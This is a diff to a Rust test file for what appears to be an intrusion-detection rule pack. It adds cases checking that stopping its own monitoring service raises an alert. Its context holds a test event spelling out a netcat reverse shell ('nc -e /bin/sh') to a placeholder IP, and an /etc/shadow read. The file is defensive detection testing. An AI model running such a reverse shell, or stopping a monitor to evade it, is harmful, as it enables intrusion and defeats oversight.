@@ -57,6 +57,14 @@ fn every_pack_rule_loads_and_the_obvious_cases_fire() {
         ),
         (
             ev(
+                "service_change",
+                "",
+                json!({"unit": "witnessd.service", "action": "stop", "result": "done"}),
+            ),
+            "witness.self.service-stopped",
+        ),
+        (
+            ev(
                 "proc_exec",
                 "/bin/nc",
                 json!({"exe": "/usr/bin/nc", "argv": ["nc", "-e", "/bin/sh", "1.2.3.4", "9"]}),
@@ -185,6 +193,16 @@ fn ordinary_activity_is_quiet() {
             "file_open_read",
             "/usr/sbin/sshd",
             json!({"path": "/etc/shadow"}),
+        ),
+        ev(
+            "service_change",
+            "",
+            json!({"unit": "witnessd.service", "action": "start", "result": "done"}),
+        ),
+        ev(
+            "service_change",
+            "",
+            json!({"unit": "cron.service", "action": "stop", "result": "done"}),
         ),
         // A shell on a tty or pipes, or a non-shell on a socket (an ordinary network service),
         // is normal.
